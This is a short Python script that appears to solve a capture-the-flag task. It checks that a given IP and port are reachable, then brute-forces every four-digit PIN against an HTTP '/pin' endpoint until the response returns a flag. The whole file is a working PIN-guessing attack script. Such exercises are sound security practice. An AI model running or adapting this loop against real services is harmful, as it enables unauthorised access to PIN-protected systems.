import requests
import socket
from tqdm import tqdm

#function to check service is available
def check_ip_port(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=3):
            print(f"Connection to {ip}:{port} successful. Let's get it on!")
            return True
    except (socket.timeout, socket.error):
        print("Timeout")
        return False
    except ConnectionRefusedError:
        print("Service not available")
        return False
    except socket.gaierror:
        print("Request fail")
    except Exception as e:
        print(f"Unknown failure: {e}.")
        return False

ip = str(input("Enter valid IP: "))         #enter IP-Address
port = int(input("Enter valid Port: "))     #enter port


#check connection
if check_ip_port(ip, port):
    
    #try PIN in range 0000 bis 9999
    for pin in tqdm(range (10000), desc="Try PINs", unit="PIN"):
        formatted_pin = f"{pin:04d}"    #convert the number to a 4-digit string (e.g., 7 becomes "0007"
    
        #send request to server
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

        #check if the server responds with success and the flag is found
        if response.ok and 'flag' in response.json():   #.ok means status code 200
            print(f"Correct PIN found: {formatted_pin}")
            print(f"Flag: {response.json()['flag']}")
            break

else:
    print(f"Connection not possible.")